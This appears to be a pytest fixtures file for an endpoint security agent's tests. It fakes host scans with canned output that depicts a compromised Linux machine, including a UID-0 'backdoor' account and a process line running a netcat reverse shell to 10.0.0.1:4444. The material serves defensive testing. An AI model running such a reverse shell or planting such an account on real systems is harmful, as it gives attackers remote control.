"""Shared fixtures + simulated endpoints for the Agent 2 test suite.

Nothing here touches a real network. Remote transports are faked with an
in-process collector whose command outputs are canned, so the scope gate, RBAC,
audit, rate-limit, analyzer, AI router and orchestrator can all be tested
deterministically.
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from endpoint_agent.core.scope import Scope, Endpoint
from endpoint_agent.core.rbac import RBAC
from endpoint_agent.core.audit import AuditLog
from endpoint_agent.core.ratelimit import RateLimiter
from endpoint_agent.core.killswitch import KillSwitch
from endpoint_agent.collector.base import EndpointCollector


# ----- a fake collector backed by canned command output --------------------
class SimulatedCollector(EndpointCollector):
    """Returns canned output per command key, so tests need no SSH/WinRM."""
    transport = "simulated"

    def __init__(self, *a, responses: dict[str, tuple[int, str, str]] | None = None,
                 fail_connect: bool = False, **kw):
        super().__init__(*a, **kw)
        self._responses = responses or {}
        self._fail_connect = fail_connect
        self._argv_to_key = {}

    def set_catalog_map(self, os_name: str):
        from endpoint_agent.collector.commands import read_only_catalog
        self._argv_to_key = {tuple(c.argv): c.key
                             for c in read_only_catalog(os_name, extras=["lynis"])}

    def _connect(self, host, **kw):
        if self._fail_connect:
            raise OSError("simulated connection refused")

    def _exec_raw(self, argv, timeout):
        key = self._argv_to_key.get(tuple(argv), "")
        return self._responses.get(key, (0, "", ""))

    def _close(self):
        pass


# A vulnerable-looking Linux host, in canned form.
LINUX_RESPONSES = {
    "os_release": (0, 'NAME="Kali GNU/Linux"\nVERSION="2026.3"', ""),
    "kernel": (0, "Linux kali 6.8.0-kali #1 SMP x86_64 GNU/Linux", ""),
    "users": (0, "root:x:0:0:root:/root:/bin/bash\n"
                 "backdoor:x:0:0::/root:/bin/bash\n"      # extra UID 0 -> CRITICAL
                 "kali:x:1000:1000::/home/kali:/bin/bash", ""),
    "ssh_config": (0, "PermitRootLogin yes\nPasswordAuthentication yes\n", ""),
    "listening": (0, "tcp LISTEN 0 128 0.0.0.0:23 0.0.0.0:*\n"
                     "tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*\n", ""),
    "suid_binaries": (0, "-rwsr-xr-x 1 root root /usr/bin/find\n", ""),
    "processes": (0, "1 0 root systemd /sbin/init\n"
                     "666 1 root nc /usr/bin/nc -e /bin/bash 10.0.0.1 4444\n", ""),
    "world_writable": (0, "/etc/passwd\n", ""),
}

WINDOWS_RESPONSES = {
    "os_info": (0, '{"Caption":"Windows 10 Pro","Version":"10.0.19045"}', ""),
    "firewall": (0, '[{"Name":"Domain","Enabled":false},'
                    '{"Name":"Public","Enabled":true}]', ""),
    "defender": (0, '{"RealTimeProtectionEnabled":false}', ""),
    "smb_shares": (0, '[{"Name":"secrets","Path":"C:\\\\secrets"}]', ""),
    "hotfixes": (0, "[]", ""),
}


@pytest.fixture
def scope():
    return Scope([Endpoint("127.0.0.1", "self"),
                  Endpoint("192.168.56.0/24", "lab"),
                  Endpoint("10.10.10.5", "win lab", "windows")])


@pytest.fixture
def rbac():
    return RBAC()


@pytest.fixture
def audit(tmp_path):
    return AuditLog(tmp_path / "audit.jsonl")


@pytest.fixture
def rate():
    return RateLimiter(1000, 1000)      # effectively unthrottled for tests


@pytest.fixture
def kill(tmp_path):
    return KillSwitch(tmp_path / "killswitch")


@pytest.fixture
def sim_linux(scope, rbac, audit, rate, kill):
    c = SimulatedCollector(scope, rbac, audit, rate, kill, role="operator",
                           responses=LINUX_RESPONSES)
    c.set_catalog_map("linux")
    return c


@pytest.fixture
def sim_windows(scope, rbac, audit, rate, kill):
    c = SimulatedCollector(scope, rbac, audit, rate, kill, role="operator",
                           responses=WINDOWS_RESPONSES)
    c.set_catalog_map("windows")
    return c


@pytest.fixture
def make_agent(tmp_path):
    """Factory for a fully wired agent whose every path lives under tmp_path."""
    from endpoint_agent.core.config import AgentConfig
    from endpoint_agent.orchestrator.agent2 import EndpointIntelligenceAgent

    def _make(scope_yaml="endpoints:\n  - identifier: '127.0.0.1'\n    note: self\n    os_hint: linux\n",
              role="operator", collector_factory=None, enable_ai=False, **overrides):
        (tmp_path / "scope.yaml").write_text(scope_yaml)
        cfg = AgentConfig(
            scope_path=str(tmp_path / "scope.yaml"), roles_path=str(tmp_path / "roles.yaml"),
            vault_path=str(tmp_path / "v.vault"), audit_path=str(tmp_path / "audit.jsonl"),
            killswitch_path=str(tmp_path / "ks"),
            known_hosts_path=str(tmp_path / "known_hosts.json"),
            approvals_path=str(tmp_path / "approvals.json"), bus_dir=str(tmp_path / "bus"),
            state_dir=str(tmp_path / "state"), reports_dir=str(tmp_path / "reports"),
            sigma_rules_dir=str(tmp_path / "sigma"), yara_rules_dir=str(tmp_path / "yara"))
        cfg.limits.rate_per_sec, cfg.limits.burst = 1000, 1000
        osv_post = overrides.pop("osv_post", None)
        for key, value in overrides.items():
            section, _, name = key.partition("__")
            if name:
                setattr(getattr(cfg, section), name, value)
            else:
                setattr(cfg, key, value)
        return EndpointIntelligenceAgent(cfg, role=role, enable_ai=enable_ai,
                                         collector_factory=collector_factory,
                                         osv_post=osv_post)
    return _make


def simulated_factory(agent_ref, responses_by_host, delay=0.0, os_name="linux"):
    """collector_factory that serves canned output per host (optionally slowly)."""
    import time as _t

    def factory(os_n, host):
        agent = agent_ref()
        c = SimulatedCollector(agent.scope, **agent._collector_kwargs(),
                               responses=responses_by_host.get(host, {}))
        c.set_catalog_map(os_n)
        if delay:
            real = c._connect
            def slow(h, **kw):
                _t.sleep(delay)
                return real(h, **kw)
            c._connect = slow
        return c
    return factory
